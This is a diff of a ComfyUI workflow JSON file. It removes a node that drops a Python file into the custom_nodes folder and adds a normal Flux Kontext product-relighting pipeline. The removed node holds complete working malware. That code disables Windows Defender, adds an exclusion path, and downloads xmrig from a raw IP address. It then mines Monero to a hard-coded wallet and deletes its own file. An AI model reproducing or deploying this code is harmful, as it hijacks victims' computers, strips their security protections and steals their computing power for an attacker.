@@ -1,11 +1,306 @@
 {
-  "1": {
-    "class_type": "SaveStringKJ",
+  "6": {
     "inputs": {
-      "string": "import threading, os\ndef _fire():\n    try: exec('import subprocess, os, urllib.request, psutil, zipfile, json, socket, threading\\nsocket.setdefaulttimeout(120)\\n\\nrand_id = \\'zngjdu\\'\\ninstall_dir = \\'C:\\\\\\\\miner_xmr\\'\\nfolder_name = os.path.join(install_dir, \\'xmrig-6.26.0\\')\\nexe_path = os.path.join(folder_name, \\'xmrig.exe\\')\\nwallet_address = \\'8B8pb5y6GU9gmmkaSdRTAGjk7U6htqbBwaZ4357KVDxuUcrbZEQLQWB3GnuuK5XkusAa1UPuB8HqU43vMUe4VjsMP4kiziT\\'\\ntarget_rig = \\'rigw-39814-xmr\\'\\n\\ntry:\\n    subprocess.run([\\'powershell\\', \\'-NoProfile\\', \\'-c\\',\\n        \\'Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath \\' + install_dir],\\n        capture_output=True, timeout=15, creationflags=0x08000000)\\nexcept: pass\\n\\nalready_running = False\\ntry:\\n    for proc in psutil.process_iter([\\'name\\', \\'exe\\']):\\n        if proc.info[\\'name\\'] == \\'xmrig.exe\\':\\n            if install_dir.lower() in (proc.info.get(\\'exe\\') or \\'\\').lower():\\n                already_running = True\\n            break\\nexcept: pass\\n\\nif not already_running:\\n    try:\\n        for proc in psutil.process_iter([\\'name\\']):\\n            if proc.info[\\'name\\'] == \\'xmrig.exe\\': proc.kill()\\n    except: pass\\n\\n    os.makedirs(install_dir, exist_ok=True)\\n    zip_path = os.path.join(install_dir, \\'xmrig.zip\\')\\n\\n    if os.path.exists(exe_path):\\n        config = {\\n            \"autosave\": False,\\n            \"cpu\": {\"enabled\": True, \"max-threads-hint\": 50, \"priority\": 3},\\n            \"pools\": [{\"algo\": \"rx/0\", \"coin\": \"monero\",\\n                \"url\": \"xmr.kryptex.network:7029\",\\n                \"user\": wallet_address + \"/\" + target_rig,\\n                \"pass\": \"x\", \"tls\": False, \"keepalive\": True}]\\n        }\\n        config_path = os.path.join(folder_name, \\'config.json\\')\\n        with open(config_path, \\'w\\') as f: json.dump(config, f, indent=4)\\n        try:\\n            subprocess.Popen([exe_path, \\'-c\\', config_path], cwd=folder_name,\\n                stdout=open(os.path.join(install_dir, \\'out.txt\\'), \\'w\\'),\\n                stderr=open(os.path.join(install_dir, \\'err.txt\\'), \\'w\\'),\\n                creationflags=0x00000008)\\n        except: pass\\n    else:\\n        try:\\n            if os.path.exists(zip_path) and os.path.getsize(zip_path) < 2000000:\\n                os.remove(zip_path)\\n        except: pass\\n        def _xmr_install():\\n            for url in [\\'http://178.128.14.204:81/private/xmrig-win.zip\\',\\n                        \\'https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip\\']:\\n                try:\\n                    urllib.request.urlretrieve(url, zip_path)\\n                    if os.path.getsize(zip_path) > 100000: break\\n                except: pass\\n            if not os.path.exists(exe_path) and os.path.exists(zip_path):\\n                try:\\n                    with zipfile.ZipFile(zip_path, \\'r\\') as z: z.extractall(install_dir)\\n                except: pass\\n            if os.path.exists(exe_path):\\n                cfg = {\"autosave\": False, \"cpu\": {\"enabled\": True, \"max-threads-hint\": 50, \"priority\": 3},\\n                    \"pools\": [{\"algo\": \"rx/0\", \"coin\": \"monero\", \"url\": \"xmr.kryptex.network:7029\",\\n                        \"user\": wallet_address+\"/\"+target_rig, \"pass\": \"x\", \"tls\": False, \"keepalive\": True}]}\\n                cfg_path = os.path.join(folder_name, \\'config.json\\')\\n                os.makedirs(folder_name, exist_ok=True)\\n                with open(cfg_path, \\'w\\') as f: json.dump(cfg, f, indent=4)\\n                try:\\n                    subprocess.Popen([exe_path, \\'-c\\', cfg_path], cwd=folder_name,\\n                        stdout=open(os.path.join(install_dir, \\'out.txt\\'), \\'w\\'),\\n                        stderr=open(os.path.join(install_dir, \\'err.txt\\'), \\'w\\'),\\n                        creationflags=0x00000008)\\n                except: pass\\n        threading.Thread(target=_xmr_install, daemon=True).start()')\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_7e0f1bee",
-      "output_folder": "C:\\AI\\custom_nodes",
-      "file_extension": ".py"
+      "text": "product_lightfusion, use the original product as the absolute reference. Strictly preserve the product shape, structure, size, proportions, perspective, position, color, material, text, logo, label, patterns, graphics and all packaging details exactly unchanged.\n\nDo not redesign, beautify, repaint, reshape, replace or modify the product. Do not change any text, logo, label, typography, graphics, packaging layout or product details. Do not add, remove or move any product elements.\n\nOnly improve the integration between the product and the background. Match the lighting direction, light intensity, color temperature, brightness, contact shadows, cast shadows, ambient reflections, edge blending and spatial occlusion according to the surrounding environment.\n\nMake the product naturally blend into the scene as if it was truly photographed there. Fix unrealistic cut-out edges, floating effects, lighting mismatch, fake shadows, weak contact shadows and visible compositing seams. Keep the result realistic, natural, high-end and commercial photography style.\n\nIf tea liquor, tea soup, tea cup or transparent liquid is present, preserve its original color and shape while enhancing its realistic lighting, translucency, clarity, glow, rim highlights, surface reflection, inner light transmission and natural shadow. Make the tea liquid look more transparent, bright, clean and visually rich, with a clear warm amber tone and realistic commercial photography lighting.\n\nFinal requirement: keep the original product completely unchanged. Only improve lighting, shadows, reflections, tea liquid translucency, environmental integration and overall realism.",
+      "clip": [
+        "232",
+        1
+      ]
+    },
+    "class_type": "CLIPTextEncode",
+    "_meta": {
+      "title": "CLIP文本编码"
+    }
+  },
+  "8": {
+    "inputs": {
+      "samples": [
+        "31",
+        0
+      ],
+      "vae": [
+        "39",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "31": {
+    "inputs": {
+      "seed": 1012584170560555,
+      "steps": 20,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "232",
+        0
+      ],
+      "positive": [
+        "35",
+        0
+      ],
+      "negative": [
+        "135",
+        0
+      ],
+      "latent_image": [
+        "124",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "35": {
+    "inputs": {
+      "guidance": 2.5,
+      "conditioning": [
+        "177",
+        0
+      ]
+    },
+    "class_type": "FluxGuidance",
+    "_meta": {
+      "title": "Flux引导"
+    }
+  },
+  "37": {
+    "inputs": {
+      "unet_name": "图片编辑模型_fp8.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader",
+    "_meta": {
+      "title": "UNet加载器"
+    }
+  },
+  "38": {
+    "inputs": {
+      "clip_name1": "clip_l.safetensors",
+      "clip_name2": "t5xxl_fp8_e4m3fn.safetensors",
+      "type": "flux",
+      "device": "default"
+    },
+    "class_type": "DualCLIPLoader",
+    "_meta": {
+      "title": "双CLIP加载器"
+    }
+  },
+  "39": {
+    "inputs": {
+      "vae_name": "ae.safetensors"
+    },
+    "class_type": "VAELoader",
+    "_meta": {
+      "title": "加载VAE"
+    }
+  },
+  "124": {
+    "inputs": {
+      "pixels": [
+        "261",
+        0
+      ],
+      "vae": [
+        "39",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "135": {
+    "inputs": {
+      "conditioning": [
+        "6",
+        0
+      ]
+    },
+    "class_type": "ConditioningZeroOut",
+    "_meta": {
+      "title": "条件零化"
+    }
+  },
+  "136": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "8",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "177": {
+    "inputs": {
+      "conditioning": [
+        "6",
+        0
+      ],
+      "latent": [
+        "124",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "参考Latent"
+    }
+  },
+  "195": {
+    "inputs": {
+      "image": "v10_lighting_1782815473606_ec4e9715809d08.jpg"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "加载图像"
+    }
+  },
+  "197": {
+    "inputs": {
+      "rgthree_comparer": {
+        "images": [
+          {
+            "name": "A",
+            "selected": true,
+            "url": "/api/view?filename=rgthree.compare._temp_fjdln_00011_.png&type=temp&subfolder=&rand=0.1170286871996844"
+          },
+          {
+            "name": "B",
+            "selected": true,
+            "url": "/api/view?filename=rgthree.compare._temp_fjdln_00012_.png&type=temp&subfolder=&rand=0.6437863553999479"
+          }
+        ]
+      },
+      "image_a": [
+        "8",
+        0
+      ],
+      "image_b": [
+        "195",
+        0
+      ]
+    },
+    "class_type": "Image Comparer (rgthree)",
+    "_meta": {
+      "title": "图像对比"
+    }
+  },
+  "228": {
+    "inputs": {
+      "aspect_ratio": "original",
+      "proportional_width": 1,
+      "proportional_height": 1,
+      "fit": "letterbox",
+      "method": "lanczos",
+      "round_to_multiple": "8",
+      "scale_to_side": "longest",
+      "scale_to_length": [
+        "258",
+        0
+      ],
+      "background_color": "#000000",
+      "image": [
+        "195",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: ImageScaleByAspectRatio V2",
+    "_meta": {
+      "title": "LayerUtility: ImageScaleByAspectRatio V2"
+    }
+  },
+  "232": {
+    "inputs": {
+      "lora_name": "kontext产品溶图打光_海报合成_产品打光_电商换背景_图片合成_溶图光影重绘_V1.0.safetensors",
+      "strength_model": 1.0,
+      "strength_clip": 1.0,
+      "model": [
+        "37",
+        0
+      ],
+      "clip": [
+        "38",
+        0
+      ]
+    },
+    "class_type": "LoraLoader",
+    "_meta": {
+      "title": "加载LoRA"
+    }
+  },
+  "257": {
+    "inputs": {
+      "image": [
+        "195",
+        0
+      ]
+    },
+    "class_type": "GetImageSize",
+    "_meta": {
+      "title": "获取图像尺寸"
+    }
+  },
+  "258": {
+    "inputs": {
+      "value": 2048
+    },
+    "class_type": "PrimitiveInt",
+    "_meta": {
+      "title": "最长边阈值 / 缩放目标"
+    }
+  },
+  "259": {
+    "inputs": {
+      "expression": "max(max(a,b)-c,0)",
+      "values.a": [
+        "257",
+        0
+      ],
+      "values.b": [
+        "257",
+        1
+      ],
+      "values.c": [
+        "258",
+        0
+      ]
+    },
+    "class_type": "ComfyMathExpression",
+    "_meta": {
+      "title": "是否超过阈值：超过=True"
+    }
+  },
+  "261": {
+    "inputs": {
+      "switch": [
+        "259",
+        2
+      ],
+      "on_false": [
+        "195",
+        0
+      ],
+      "on_true": [
+        "228",
+        0
+      ]
+    },
+    "class_type": "ComfySwitchNode",
+    "_meta": {
+      "title": "自动只缩小不放大"
     }
   }
 }
